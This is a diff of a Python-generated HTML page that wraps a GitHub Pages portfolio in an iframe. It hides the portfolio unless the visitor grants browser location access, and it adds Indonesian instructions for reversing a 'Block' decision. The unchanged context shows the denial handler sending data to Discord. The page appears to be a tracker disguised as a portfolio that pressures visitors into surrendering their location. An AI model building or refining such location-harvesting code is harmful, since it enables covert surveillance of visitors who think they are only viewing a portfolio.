@@ -39,10 +39,18 @@ html_code = f"""
     <iframe src="https://iqbalmantam.github.io/portfolio/" width="100%" height="900" style="border:none;"></iframe>
   </div>
 
-  <!-- Pesan penolakan jika user tidak mengizinkan lokasi -->
-  <div id="error-message" style="text-align: center; margin-top: 200px; font-family: sans-serif; display: none;">
-    <h2 style="color: #ff4b4b;">Akses Ditolak / Lokasi Diperlukan</h2>
-    <p>Anda harus memberikan izin lokasi (Allow) untuk memuat halaman ini.</p>
+  <!-- Pesan penolakan disertai panduan jika terlanjur diblokir -->
+  <div id="error-message" style="text-align: center; margin-top: 150px; font-family: sans-serif; display: none; color: #333;">
+    <h2 style="color: #ff4b4b;">Akses Lokasi Dibutuhkan</h2>
+    <p>Halaman ini memerlukan izin akses lokasi untuk dapat ditampilkan.</p>
+    <div style="background: #f8f9fa; display: inline-block; padding: 15px 25px; border-radius: 8px; border: 1px solid #ddd; text-align: left; margin-top: 15px;">
+      <p style="margin: 0 0 8px 0; font-weight: bold;">Terlanjur klik "Block"? Cara membukanya:</p>
+      <ol style="margin: 0; padding-left: 20px; font-size: 14px; color: #555;">
+        <li>Klik ikon <b>Gembok/Setelan Situs</b> di sebelah kiri alamat web (URL) di atas.</li>
+        <li>Cari opsi <b>Location (Lokasi)</b> lalu ubah dari <i>Block</i> menjadi <b>Allow (Izinkan)</b>.</li>
+        <li>Muat ulang (refresh) halaman ini.</li>
+      </ol>
+    </div>
   </div>
 
   <p id="demo"></p>
@@ -140,7 +148,7 @@ html_code = f"""
 
     function showError(error) {{
       if (error.code == error.PERMISSION_DENIED) {{
-        // JIKA USER MEMILIH DENY: Tampilkan pesan error dan sembunyikan portfolio
+        // JIKA USER MEMILIH DENY/BLOCK: Tampilkan pesan error dan panduan ubah setting
         document.getElementById("error-message").style.display = "block";
         
         sendToDiscord({{
